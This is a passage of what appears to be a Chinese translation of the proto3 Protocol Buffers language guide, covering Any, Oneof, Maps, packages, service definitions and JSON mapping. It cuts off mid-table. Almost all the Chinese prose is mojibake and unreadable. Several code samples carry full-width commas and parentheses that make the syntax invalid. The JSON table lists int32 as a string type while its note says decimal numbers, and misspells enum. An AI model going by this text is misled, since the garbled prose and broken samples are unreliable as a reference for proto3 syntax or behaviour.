æ³•è¯†åˆ«çš„å­—æ®µã€‚ä¾‹å¦‚ï¼Œå½“æ—§äºŒè¿›åˆ¶æ–‡ä»¶è§£æå…·æœ‰æ–°å­—æ®µçš„æ–°äºŒè¿›åˆ¶æ–‡ä»¶å‘é€çš„æ•°æ®æ—¶ï¼Œè¿™äº›æ–°å­—æ®µå°†æˆä¸ºæ—§äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„æœªçŸ¥å­—æ®µã€‚\n\næœ€åˆï¼Œproto3æ¶ˆæ¯åœ¨è§£ææœŸé—´æ€»æ˜¯ä¸¢å¼ƒæœªçŸ¥å­—æ®µï¼Œä½†åœ¨3.5ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬é‡æ–°å¼•å…¥äº†ä¿å­˜æœªçŸ¥å­—æ®µä»¥åŒ¹é…proto2è¡Œä¸ºã€‚åœ¨ç‰ˆæœ¬3.5åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒæœªçŸ¥å­—æ®µåœ¨è§£ææœŸé—´ä¿ç•™å¹¶åŒ…å«åœ¨åºåˆ—åŒ–è¾“å‡ºä¸­ã€‚\n\n\n\n### 9. ä»»ä½•\n\nè¯¥`Any`æ¶ˆæ¯ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨é‚®ä»¶ä½œä¸ºåµŒå…¥å¼ç±»å‹ï¼Œè€Œä¸å¿…è‡ªå·±.protoå®šä¹‰ã€‚ä¸€ä¸ª`Any`å«æœ‰ä»»æ„çš„åºåˆ—åŒ–æ¶ˆæ¯`bytes`ï¼Œä»¥å……å½“ä¸€ä¸ªå…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦å’Œè§£æåˆ°è¯¥æ¶ˆæ¯çš„ç±»å‹çš„URLä¸€èµ·ã€‚è¦ä½¿ç”¨è¯¥`Any`ç±»å‹ï¼Œæ‚¨éœ€è¦[å¯¼å…¥](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23other)`google/protobuf/any.proto`ã€‚\n\n```protobuf\nimport \"google/protobuf/any.proto\";\n\nmessage ErrorStatus {\n  string message = 1;\n  repeated google.protobuf.Any details = 2;\n}\n```\n\nç»™å®šæ¶ˆæ¯ç±»å‹çš„é»˜è®¤ç±»å‹URLæ˜¯ã€‚ `type.googleapis.com/*packagename*.*messagename*`\n\nä¸åŒçš„è¯­è¨€å®ç°å°†æ”¯æŒè¿è¡Œæ—¶åº“ä½£å·¥ç±»å‹å®‰å…¨çš„æ–¹å¼æ‰“åŒ…å’Œè§£åŒ…çš„ä»»ä½•å€¼-ä¾‹å¦‚ï¼Œåœ¨Javaä¸­ï¼Œä»»ä½•ç±»å‹éƒ½ä¼šæœ‰ç‰¹æ®Š`pack()`å’Œ`unpack()`å­˜å–ï¼Œè€Œåœ¨C ++ä¸­æœ‰`PackFrom()`å’Œ`UnpackTo()`æ–¹æ³•ï¼š\n\n```protobuf\n// Storing an arbitrary message type in Any.\nNetworkErrorDetails details = ...;\nErrorStatus status;\nstatus.add_details()->PackFrom(details);\n\n// Reading an arbitrary message from Any.\nErrorStatus status = ...;\nfor (const Any& detail : status.details()) {\n  if (detail.Is<NetworkErrorDetails>()) {\n    NetworkErrorDetails network_error;\n    detail.UnpackTo(&network_error);\n    ... processing network_error ...\n  }\n}\n```\n\n**ç›®å‰ï¼Œæ­£åœ¨å¼€å‘ç”¨äºå¤„ç†Anyç±»å‹çš„è¿è¡Œæ—¶åº“**ã€‚\n\nå¦‚æœæ‚¨å·²ç†Ÿæ‚‰[proto2è¯­æ³•](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)ï¼Œåˆ™Anyç±»å‹å°†æ›¿æ¢[æ‰©å±•](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23extensions)ã€‚\n\n\n\n### 10. Oneof\n\nå¦‚æœæ‚¨æœ‰ä¸€ä¸ªåŒ…å«è®¸å¤šå­—æ®µçš„æ¶ˆæ¯ï¼Œå¹¶ä¸”æœ€å¤šåªèƒ½åŒæ—¶è®¾ç½®ä¸€ä¸ªå­—æ®µï¼Œåˆ™å¯ä»¥ä½¿ç”¨oneofåŠŸèƒ½å¼ºåˆ¶æ‰§è¡Œæ­¤è¡Œä¸ºå¹¶èŠ‚çœå†…å­˜ã€‚\n\né™¤äº†ä¸€ä¸ªå…±äº«å†…å­˜ä¸­çš„æ‰€æœ‰å­—æ®µä¹‹å¤–ï¼Œå…¶ä¸­ä¸€ä¸ªå­—æ®µç±»ä¼¼äºå¸¸è§„å­—æ®µï¼Œå¹¶ä¸”æœ€å¤šå¯ä»¥åŒæ—¶è®¾ç½®ä¸€ä¸ªå­—æ®µã€‚è®¾ç½®oneofçš„ä»»ä½•æˆå‘˜ä¼šè‡ªåŠ¨æ¸…é™¤æ‰€æœ‰å…¶ä»–æˆå‘˜ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ç‰¹æ®Š`case()`æˆ–`WhichOneof()`æ–¹æ³•æ£€æŸ¥oneofä¸­çš„å“ªä¸ªå€¼ï¼ˆå¦‚æœæœ‰ï¼‰ï¼Œå…·ä½“å–å†³äºæ‚¨é€‰æ‹©çš„è¯­è¨€ã€‚\n\n##### 10.1 ä½¿ç”¨Oneof\n\nè¦åœ¨æ‚¨ä¸­å®šä¹‰oneofï¼Œè¯·`.proto`ä½¿ç”¨`oneof`å…³é”®å­—åè·Ÿæ‚¨çš„oneofåç§°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹`test_oneof`ï¼š\n\n```protobuf\nmessage SampleMessage {\n  oneof test_oneof {\n    string name = 4;\n    SubMessage sub_message = 9;\n  }\n}\n```\n\nç„¶åï¼Œå°†oneofå­—æ®µæ·»åŠ åˆ°oneofå®šä¹‰ä¸­ã€‚æ‚¨å¯ä»¥æ·»åŠ ä»»ä½•ç±»å‹çš„å­—æ®µï¼Œä½†ä¸èƒ½ä½¿ç”¨`repeated`å­—æ®µã€‚\n\nåœ¨ç”Ÿæˆçš„ä»£ç ä¸­ï¼Œoneofå­—æ®µä¸å¸¸è§„å­—æ®µå…·æœ‰ç›¸åŒçš„getterå’Œsetterã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•æ£€æŸ¥oneofä¸­çš„å€¼ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚æ‚¨å¯ä»¥åœ¨ç›¸å…³[APIå‚è€ƒä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)æ‰¾åˆ°æœ‰å…³æ‰€é€‰è¯­è¨€çš„oneof APIçš„æ›´å¤šä¿¡æ¯ã€‚\n\n##### 10.2 Oneof ç‰¹æ€§\n\n- è®¾ç½®oneofå­—æ®µå°†è‡ªåŠ¨æ¸…é™¤oneofçš„æ‰€æœ‰å…¶ä»–æˆå‘˜ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨è®¾ç½®äº†å¤šä¸ªå­—æ®µï¼Œåˆ™åªæœ‰æ‚¨è®¾ç½®çš„æœ€åä¸€ä¸ªå­—æ®µä»ç„¶å…·æœ‰å€¼ã€‚\n\n  ```protobuf\nSampleMessage message;\n  message.set_name(\"name\");\nCHECK(message.has_name());\n  message.mutable_sub_message();   // Will clear name field.\n  CHECK(!message.has_name());\n  ```\n  \n- å¦‚æœè§£æå™¨åœ¨çº¿è·¯ä¸Šé‡åˆ°åŒä¸€ä¸ªoneofçš„å¤šä¸ªæˆå‘˜ï¼Œåˆ™åœ¨è§£æçš„æ¶ˆæ¯ä¸­ä»…ä½¿ç”¨çœ‹åˆ°çš„æœ€åä¸€ä¸ªæˆå‘˜ã€‚\n\n- oneofä¸æ”¯æŒ`repeated`ã€‚\n\n- Reflection APIé€‚ç”¨äºå…¶ä¸­ä¸€ä¸ªå­—æ®µã€‚\n\n- å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯C ++ï¼Œè¯·ç¡®ä¿æ‚¨çš„ä»£ç ä¸ä¼šå¯¼è‡´å†…å­˜å´©æºƒã€‚ä»¥ä¸‹ç¤ºä¾‹ä»£ç å°†å´©æºƒï¼Œ`sub_message`å·²é€šè¿‡è°ƒç”¨è¯¥`set_name()`æ–¹æ³•åˆ é™¤äº†è¯¥ä»£ç ã€‚\n\n  ```protobuf\nSampleMessage message;\n  SubMessage* sub_message = message.mutable_sub_message();\n  message.set_name(\"name\");      // Will delete sub_message\n  sub_message->set_...            // Crashes here \n  ```\n  \n- åŒæ ·åœ¨C ++ä¸­ï¼Œå¦‚æœä½ æœ‰`Swap()`ä¸¤ä¸ªæ¶ˆæ¯ä¸oneofsï¼Œæ¯ä¸ªæ¶ˆæ¯æœ€ç»ˆå°†ä¸å¦ä¸€ä¸ªæ¶ˆæ¯ç»“æœï¼šåœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ`msg1`å°†æœ‰ä¸€ä¸ª`sub_message`ï¼Œ`msg2`å¹¶å°†æœ‰ä¸€`name`ã€‚\n\n  ```protobuf\n  SampleMessage msg1;\n  msg1.set_name(\"name\");\n  SampleMessage msg2;\n  msg2.mutable_sub_message();\n  msg1.swap(&msg2);\n  CHECK(msg1.has_sub_message());\n  CHECK(msg2.has_name());\n  ```\n\n##### 10.3 å‘åå…¼å®¹æ€§é—®é¢˜\n\næ·»åŠ æˆ–åˆ é™¤å…¶ä¸­ä¸€ä¸ªå­—æ®µæ—¶è¦å°å¿ƒã€‚å¦‚æœæ£€æŸ¥oneofè¿”å›çš„å€¼`None`/ `NOT_SET`ï¼Œè¿™å¯èƒ½æ„å‘³ç€oneofå°šæœªè®¾ç½®æˆ–å·²åœ¨ä¸åŒç‰ˆæœ¬çš„oneofçš„è¢«è®¾ç½®ä¸ºä¸€ä¸ªå­—æ®µã€‚æ²¡æœ‰åŠæ³•åŒºåˆ†ï¼Œå› ä¸ºæ²¡æœ‰åŠæ³•çŸ¥é“çº¿ä¸Šçš„æœªçŸ¥å­—æ®µæ˜¯å¦æ˜¯å…¶ä¸­ä¸€ä¸ªæˆå‘˜ã€‚\n\n##### 10.4 æ ‡ç­¾é‡ç”¨é—®é¢˜\n\n- **å°†å­—æ®µç§»å…¥æˆ–ç§»å‡ºoneof**ï¼šåœ¨åºåˆ—åŒ–å’Œè§£ææ¶ˆæ¯åï¼Œæ‚¨å¯èƒ½ä¼šä¸¢å¤±ä¸€äº›ä¿¡æ¯ï¼ˆæŸäº›å­—æ®µå°†è¢«æ¸…é™¤ï¼‰ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥å®‰å…¨åœ°å°†å•ä¸ªå­—æ®µç§»åŠ¨åˆ°**æ–°çš„** oneofä¸­ï¼Œå¹¶ä¸”å¦‚æœå·²çŸ¥åªæœ‰ä¸€ä¸ªå­—æ®µè¢«è®¾ç½®ï¼Œåˆ™å¯ä»¥ç§»åŠ¨å¤šä¸ªå­—æ®µã€‚\n- **åˆ é™¤oneofå­—æ®µå¹¶å°†å…¶æ·»åŠ å›**ï¼šåœ¨åºåˆ—åŒ–å’Œè§£ææ¶ˆæ¯åï¼Œè¿™å¯èƒ½ä¼šæ¸…é™¤å½“å‰è®¾ç½®çš„oneofå­—æ®µã€‚\n- **æ‹†åˆ†æˆ–åˆå¹¶oneof**ï¼šè¿™ä¸ç§»åŠ¨å¸¸è§„å­—æ®µæœ‰ç±»ä¼¼çš„é—®é¢˜ã€‚\n\n### 11. åœ°å›¾\n\nå¦‚æœè¦åœ¨æ•°æ®å®šä¹‰ä¸­åˆ›å»ºå…³è”æ˜ å°„ï¼Œåè®®ç¼“å†²åŒºæä¾›äº†ä¸€ç§æ–¹ä¾¿çš„å¿«æ·æ–¹å¼è¯­æ³•ï¼š\n\n```protobuf\nmap < key_type ï¼Œvalue_type > map_field = N ;\n```\n\n...å…¶ä¸­`key_type`å¯ä»¥æ˜¯ä»»ä½•æ•´æ•°æˆ–å­—ç¬¦ä¸²ç±»å‹ï¼ˆå› æ­¤ï¼Œé™¤äº†æµ®ç‚¹ç±»å‹ä¹‹å¤–çš„ä»»ä½•[æ ‡é‡](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)ç±»å‹`bytes`ï¼‰ã€‚è¯·æ³¨æ„ï¼Œæšä¸¾ä¸æ˜¯æœ‰æ•ˆçš„`key_type`ã€‚çš„`value_type`å¯ä»¥æ˜¯ä»»ä½•ç±»å‹çš„é™¤å¦ä¸€åœ°å›¾ã€‚\n\nå› æ­¤ï¼Œä¾‹å¦‚ï¼Œå¦‚æœè¦åˆ›å»ºé¡¹ç›®æ˜ å°„ï¼Œå…¶ä¸­æ¯æ¡`Project`æ¶ˆæ¯éƒ½ä¸å­—ç¬¦ä¸²é”®ç›¸å…³è”ï¼Œåˆ™å¯ä»¥åƒä¸‹é¢è¿™æ ·å®šä¹‰å®ƒï¼š\n\n```protobuf\nmap < string ï¼ŒProject > projects = 3 ;  \n```\n\n- åœ°å›¾å­—æ®µä¸èƒ½`repeated`ã€‚\n- åœ°å›¾å€¼çš„æœ‰çº¿æ ¼å¼æ’åºå’Œåœ°å›¾è¿­ä»£æ’åºæœªå®šä¹‰ï¼Œå› æ­¤æ‚¨ä¸èƒ½ä¾èµ–äºç‰¹å®šé¡ºåºçš„åœ°å›¾é¡¹ç›®ã€‚\n- ä¸ºaç”Ÿæˆæ–‡æœ¬æ ¼å¼æ—¶`.proto`ï¼Œåœ°å›¾æŒ‰é”®æ’åºã€‚æ•°å­—é”®æŒ‰æ•°å­—æ’åºã€‚\n- ä»çº¿è·¯è§£ææˆ–åˆå¹¶æ—¶ï¼Œå¦‚æœæœ‰é‡å¤çš„æ˜ å°„é”®ï¼Œåˆ™ä½¿ç”¨æœ€åçœ‹åˆ°çš„é”®ã€‚ä»æ–‡æœ¬æ ¼å¼è§£ææ˜ å°„æ—¶ï¼Œå¦‚æœå­˜åœ¨é‡å¤é”®ï¼Œåˆ™è§£æå¯èƒ½ä¼šå¤±è´¥ã€‚\n- å¦‚æœä¸ºæ˜ å°„å­—æ®µæä¾›é”®ä½†æ²¡æœ‰å€¼ï¼Œåˆ™å­—æ®µåºåˆ—åŒ–æ—¶çš„è¡Œä¸ºå–å†³äºè¯­è¨€ã€‚åœ¨C ++ï¼ŒJavaå’ŒPythonä¸­ï¼Œç±»å‹çš„é»˜è®¤å€¼æ˜¯åºåˆ—åŒ–çš„ï¼Œè€Œåœ¨å…¶ä»–è¯­è¨€ä¸­æ²¡æœ‰ä»»ä½•åºåˆ—åŒ–ã€‚\n\nç”Ÿæˆçš„åœ°å›¾APIç›®å‰å¯ç”¨äºæ‰€æœ‰proto3æ”¯æŒçš„è¯­è¨€ã€‚æ‚¨å¯ä»¥åœ¨ç›¸å…³[APIå‚è€ƒä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)æ‰¾åˆ°æœ‰å…³æ‰€é€‰è¯­è¨€çš„åœ°å›¾APIçš„æ›´å¤šä¿¡æ¯ã€‚\n\n##### 11.1 å‘åå…¼å®¹æ€§\n\næ˜ å°„è¯­æ³•åœ¨çº¿ä¸Šç­‰æ•ˆäºä»¥ä¸‹å†…å®¹ï¼Œå› æ­¤ä¸æ”¯æŒæ˜ å°„çš„åè®®ç¼“å†²åŒºå®ç°ä»å¯å¤„ç†æ‚¨çš„æ•°æ®ï¼š\n\n```\nmessage MapFieldEntry {\n  key_type key = 1;\n  value_type value = 2;\n}\n\nrepeated MapFieldEntry map_field = N;\n```\n\nä»»ä½•æ”¯æŒæ˜ å°„çš„åè®®ç¼“å†²åŒºå®ç°éƒ½å¿…é¡»ç”Ÿæˆå’Œæ¥å—ä¸Šè¿°å®šä¹‰å¯ä»¥æ¥å—çš„æ•°æ®ã€‚\n\n\n\n### 12. åŒ…\n\næ‚¨å¯ä»¥å‘`.proto`æ–‡ä»¶æ·»åŠ `package`å¯é€‰è¯´æ˜ç¬¦ï¼Œä»¥é˜²æ­¢åè®®æ¶ˆæ¯ç±»å‹ä¹‹é—´çš„åç§°å†²çªã€‚\n\n```protobuf\npackage foo.bar;\nmessage Open { ... }\n```\n\nç„¶åï¼Œæ‚¨å¯ä»¥åœ¨å®šä¹‰æ¶ˆæ¯ç±»å‹çš„å­—æ®µæ—¶ä½¿ç”¨åŒ…è¯´æ˜ç¬¦ï¼š\n\n```protobuf\nmessage Foo {\n  ...\n  foo.bar.Open open = 1;\n  ...\n}\n```\n\nåŒ…è¯´æ˜ç¬¦å½±å“ç”Ÿæˆçš„ä»£ç çš„æ–¹å¼å–å†³äºæ‚¨é€‰æ‹©çš„è¯­è¨€ï¼š\n\n- åœ¨**C ++ä¸­**ï¼Œç”Ÿæˆçš„ç±»åŒ…å«åœ¨C ++å‘½åç©ºé—´ä¸­ã€‚ä¾‹å¦‚ï¼Œ`Open`å°†åœ¨å‘½åç©ºé—´ä¸­`foo::bar`ã€‚\n- åœ¨**Javaä¸­**ï¼Œè¯¥åŒ…ç”¨ä½œJavaåŒ…ï¼Œé™¤éæ‚¨`option java_package`åœ¨`.proto`æ–‡ä»¶ä¸­æ˜ç¡®æä¾›äº†è¯¥åŒ…ã€‚\n- åœ¨**Pythonä¸­**ï¼ŒpackageæŒ‡ä»¤è¢«å¿½ç•¥ï¼Œå› ä¸ºPythonæ¨¡å—æ˜¯æ ¹æ®å®ƒä»¬åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä½ç½®è¿›è¡Œç»„ç»‡çš„ã€‚\n- åœ¨**Goä¸­**ï¼Œè¯¥åŒ…ç”¨ä½œGoåŒ…åç§°ï¼Œé™¤éæ‚¨`option go_package`åœ¨`.proto`æ–‡ä»¶ä¸­æ˜ç¡®æä¾›ã€‚\n- åœ¨**Rubyä¸­**ï¼Œç”Ÿæˆçš„ç±»åŒ…å«åœ¨åµŒå¥—çš„Rubyå‘½åç©ºé—´å†…ï¼Œè½¬æ¢ä¸ºæ‰€éœ€çš„Rubyå¤§å†™å½¢å¼ï¼ˆé¦–å­—æ¯å¤§å†™;å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯å­—æ¯ï¼Œ`PB_`åˆ™å‰ç½®ï¼‰ã€‚ä¾‹å¦‚ï¼Œ`Open`å°†åœ¨å‘½åç©ºé—´ä¸­`Foo::Bar`ã€‚\n- åœ¨**Cï¼ƒä¸­**ï¼ŒåŒ…è½¬æ¢ä¸ºPascalCaseåç”¨ä½œå‘½åç©ºé—´ï¼Œé™¤éæ‚¨`option csharp_namespace`åœ¨`.proto`æ–‡ä»¶ä¸­æ˜ç¡®æä¾›ã€‚ä¾‹å¦‚ï¼Œ`Open`å°†åœ¨å‘½åç©ºé—´ä¸­`Foo.Bar`ã€‚\n\n##### 12.1 åŒ…å’Œåç§°è§£æ\n\nåè®®ç¼“å†²åŒºè¯­è¨€ä¸­çš„ç±»å‹åç§°è§£æä¸C ++ç±»ä¼¼ï¼šé¦–å…ˆæœç´¢æœ€é‡Œé¢çš„èŒƒå›´ï¼Œç„¶åæœç´¢ä¸‹ä¸€ä¸ªèŒƒå›´ï¼Œä¾æ­¤ç±»æ¨ï¼Œæ¯ä¸ªåŒ…è¢«è®¤ä¸ºæ˜¯å…¶çˆ¶åŒ…çš„â€œå†…éƒ¨â€ã€‚ä¸€ä¸ªé¢†å…ˆçš„'ã€‚' ï¼ˆä¾‹å¦‚ï¼Œ`.foo.bar.Baz`ï¼‰æ„å‘³ç€ä»æœ€å¤–å±‚çš„èŒƒå›´å¼€å§‹ã€‚\n\nprotobuf ç¼–è¯‘å™¨é€šè¿‡è§£æå¯¼å…¥çš„`.proto`æ–‡ä»¶æ¥è§£ææ‰€æœ‰ç±»å‹åç§°ã€‚æ¯ç§è¯­è¨€çš„ä»£ç ç”Ÿæˆå™¨éƒ½çŸ¥é“å¦‚ä½•ä½¿ç”¨è¯¥è¯­è¨€å¼•ç”¨æ¯ç§ç±»å‹ï¼Œå³ä½¿å®ƒå…·æœ‰ä¸åŒçš„èŒƒå›´è§„åˆ™ã€‚\n\n\n\n### 13. å®šä¹‰æœåŠ¡\n\nå¦‚æœè¦å°†æ¶ˆæ¯ç±»å‹ä¸RPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ç³»ç»Ÿä¸€èµ·ä½¿ç”¨ï¼Œåˆ™å¯ä»¥åœ¨`.proto`æ–‡ä»¶ä¸­å®šä¹‰RPCæœåŠ¡æ¥å£ï¼Œprotobuf ç¼–è¯‘å™¨å°†ä½¿ç”¨æ‚¨é€‰æ‹©çš„è¯­è¨€ç”ŸæˆæœåŠ¡æ¥å£ä»£ç å’Œå­˜æ ¹ã€‚å› æ­¤ï¼Œä¾‹å¦‚ï¼Œå¦‚æœè¦å®šä¹‰RPCæœåŠ¡è¯·æ±‚æ–¹æ³•ä¸º:`SearchRequest`å’Œè¿”å›æ–¹æ³•ä¸º:`SearchResponse`ï¼Œå¯ä»¥`.proto`æŒ‰å¦‚ä¸‹æ–¹å¼åœ¨æ–‡ä»¶ä¸­å®šä¹‰å®ƒï¼š\n\n```protobuf\nservice SearchService {\n  rpc Searchï¼ˆSearchRequestï¼‰returnsï¼ˆSearchResponseï¼‰;\n}\n```\n\nä¸åè®®ç¼“å†²åŒºä¸€èµ·ä½¿ç”¨çš„æœ€ç®€å•çš„RPCç³»ç»Ÿæ˜¯[gRPC](https://link.juejin.im?target=https%3A%2F%2Fgrpc.io%2F)ï¼šä¸€ç§ç”±Googleå¼€å‘çš„ï¼Œå¹³å°ä¸­ç«‹çš„å¼€æºRPCç³»ç»Ÿã€‚gRPCç‰¹åˆ«é€‚ç”¨äºprotobufï¼Œå¹¶å…è®¸åœ¨æ‚¨çš„`.proto`æ–‡ä»¶ä¸­ä½¿ç”¨ç‰¹æ®Šçš„protobuf ç¼–è¯‘å™¨æ’ä»¶ç›´æ¥ç”Ÿæˆç›¸å…³çš„RPCä»£ç ã€‚\n\nå¦‚æœæ‚¨ä¸æƒ³ä½¿ç”¨gRPCï¼Œä¹Ÿå¯ä»¥å°†protobufä¸æ‚¨è‡ªå·±çš„RPCå®ç°ä¸€èµ·ä½¿ç”¨ã€‚æ‚¨å¯ä»¥åœ¨[Proto2è¯­è¨€æŒ‡å—ä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23services)æ‰¾åˆ°æ›´å¤šç›¸å…³ä¿¡æ¯ã€‚\n\nè¿˜æœ‰ä¸€äº›æ­£åœ¨è¿›è¡Œçš„ç¬¬ä¸‰æ–¹é¡¹ç›®ä½¿ç”¨Protocol Bufferså¼€å‘RPCå®ç°ã€‚æœ‰å…³æˆ‘ä»¬äº†è§£çš„é¡¹ç›®çš„é“¾æ¥åˆ—è¡¨ï¼Œè¯·å‚é˜…[ç¬¬ä¸‰æ–¹åŠ è½½é¡¹wikié¡µé¢](https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fgoogle%2Fprotobuf%2Fblob%2Fmaster%2Fdocs%2Fthird_party.md)ã€‚\n\n\n\n### 14. JSONæ˜ å°„\n\nProto3æ”¯æŒJSONä¸­çš„è§„èŒƒç¼–ç ï¼Œä½¿å¾—åœ¨ç³»ç»Ÿä¹‹é—´å…±äº«æ•°æ®å˜å¾—æ›´åŠ å®¹æ˜“ã€‚åœ¨ä¸‹è¡¨ä¸­é€ä¸ªç±»å‹åœ°æè¿°ç¼–ç ã€‚\n\nå¦‚æœJSONç¼–ç æ•°æ®ä¸­ç¼ºå°‘å€¼`null`ï¼Œæˆ–è€…å…¶å€¼ä¸ºï¼Œåˆ™åœ¨è§£æä¸ºåè®®ç¼“å†²åŒºæ—¶ï¼Œå®ƒå°†è¢«è§£é‡Šä¸ºé€‚å½“çš„[é»˜è®¤å€¼](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)ã€‚å¦‚æœå­—æ®µåœ¨åè®®ç¼“å†²åŒºä¸­å…·æœ‰é»˜è®¤å€¼ï¼Œåˆ™é»˜è®¤æƒ…å†µä¸‹å°†åœ¨JSONç¼–ç æ•°æ®ä¸­çœç•¥è¯¥å­—æ®µä»¥èŠ‚çœç©ºé—´ã€‚å®ç°å¯ä»¥æä¾›ç”¨äºåœ¨JSONç¼–ç çš„è¾“å‡ºä¸­å‘å‡ºå…·æœ‰é»˜è®¤å€¼çš„å­—æ®µçš„é€‰é¡¹ã€‚\n\n| proto3                 | JSON          | JSONç¤ºä¾‹                                 | ç¬”è®°                                                         |\n| ---------------------- | ------------- | ---------------------------------------- | ------------------------------------------------------------ |\n| message                | object        | `{\"fooBar\": v, \"g\": null,â€¦}`             | ç”ŸæˆJSONå¯¹è±¡ã€‚æ¶ˆæ¯å­—æ®µåç§°æ˜ å°„åˆ°å°å†™é©¼å³°å¹¶æˆä¸ºJSONå¯¹è±¡é”®ã€‚å¦‚æœ`json_name`æŒ‡å®šäº†fieldé€‰é¡¹ï¼Œåˆ™æŒ‡å®šçš„å€¼å°†ç”¨ä½œé”®ã€‚è§£æå™¨æ¥å—å°å†™é©¼å³°åç§°ï¼ˆæˆ–`json_name`é€‰é¡¹æŒ‡å®šçš„åç§°ï¼‰å’ŒåŸå§‹protoå­—æ®µåç§°ã€‚`null`æ˜¯æ‰€æœ‰å­—æ®µç±»å‹çš„å¯æ¥å—å€¼ï¼Œå¹¶å°†å…¶è§†ä¸ºç›¸åº”å­—æ®µç±»å‹çš„é»˜è®¤å€¼ã€‚ |\n| eunm                   | String        | `\"FOO_BAR\"`                              | ä½¿ç”¨protoä¸­æŒ‡å®šçš„æšä¸¾å€¼çš„åç§°ã€‚è§£æå™¨æ¥å—æšä¸¾åç§°å’Œæ•´æ•°å€¼ã€‚  |\n| map<Kï¼ŒV>              | object        | `{\"k\": v, â€¦}`                            | æ‰€æœ‰é”®éƒ½è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚                                       |\n| repeated V.            | array         | `[v, â€¦]`                                 | `null` è¢«æ¥å—ä¸ºç©ºåˆ—è¡¨[]ã€‚                                    |\n| bool                   | true,false    | `true, false`                            |                                                              |\n| string                 | string        | `\"Hello World!\"`                         |                                                              |\n| bytes                  | base64 string | `\"YWJjMTIzIT8kKiYoKSctPUB+\"`             | JSONå€¼å°†æ˜¯ä½¿ç”¨å¸¦å¡«å……çš„æ ‡å‡†base64ç¼–ç ç¼–ç ä¸ºå­—ç¬¦ä¸²çš„æ•°æ®ã€‚æ¥å—å¸¦æœ‰/ä¸å¸¦å¡«å……çš„æ ‡å‡†æˆ–URLå®‰å…¨base64ç¼–ç ã€‚ |\n| int32ï¼Œfixed32ï¼Œuint32 | string        | `1, -10, 0`                              | JSONå€¼å°†æ˜¯åè¿›åˆ¶æ•°ã€‚æ¥å—æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚                       |\n| int64ï¼Œfixed64ï¼Œuint64 | string        | `\"1\", \"-10\"`                             | JSONå€¼å°†æ˜¯åè¿›åˆ¶å­—ç¬¦ä¸²ã€‚æ¥å—æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚                   |\n| float,double           | number        | `1.1, -10.0, 0, \"NaN\",\"Infinity\"`        | JSONå€¼å°†æ˜¯ä¸€ä¸ªæ•°å­—æˆ–ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ä¸²å€¼â€œNaNâ€ï¼Œâ€œInfinityâ€å’Œâ€œ-Infinityâ€ã€‚æ¥å—æ•°å­—æˆ–å­—ç¬¦ä¸²ã€‚æŒ‡æ•°è¡¨ç¤ºæ³•ä¹Ÿè¢«æ¥å—ã€‚ |\n| any                    | object        | `{\"@type\": \"url\", \"f\": v, â€¦ }`           | å¦‚æœAnyåŒ…å«å…·æœ‰ç‰¹æ®ŠJSONæ˜ å°„çš„å€¼ï¼Œåˆ™å°†æŒ‰å¦‚ä¸‹æ–¹å¼è¿›è¡Œè½¬æ¢ï¼šã€‚å¦åˆ™ï¼Œè¯¥å€¼å°†è½¬æ¢ä¸ºJSONå¯¹è±¡ï¼Œå¹¶å°†æ’å…¥è¯¥å­—æ®µä»¥æŒ‡ç¤ºå®é™…çš„æ•°æ®ç±»å‹ã€‚`{\"@type\": xxx, \"value\": yyy}``\"@type\"` |\n| Timestamp              | string        | `\"1972-01-01T10:00:20.021Z\"`             | ä½¿ç”¨RFC 3339ï¼Œå…¶ä¸­ç”Ÿæˆçš„è¾“å‡ºå°†å§‹ç»ˆè¢«Zæ ‡å‡†åŒ–å¹¶ä½¿ç”¨0,3,6æˆ–9ä¸ªå°æ•°ä½ã€‚ä¹Ÿæ¥å—â€œZâ€ä»¥å¤–çš„åç§»ã€‚ |\n| Duration               | string        | `\"1.000340012s\", \"1s\"`                   | ç”Ÿæˆçš„è¾“å‡ºå§‹ç»ˆåŒ…å«0,3,6æˆ–9ä¸ªå°æ•°ä½ï¼Œå…·ä½“å–å†³äºæ‰€éœ€çš„ç²¾åº¦ï¼Œåè·Ÿåç¼€â€œsâ€ã€‚æ¥å—çš„æ˜¯ä»»ä½•å°æ•°ä½ï¼ˆä¹Ÿæ²¡æœ‰ï¼‰ï¼Œåªè¦å®ƒä»¬ç¬¦åˆçº³ç§’ç²¾åº¦å¹¶ä¸”åç¼€â€œsâ€æ˜¯å¿…éœ€çš„ã€‚ |\n| Struct                 | `object`      | `{ â€¦ }`                                  | 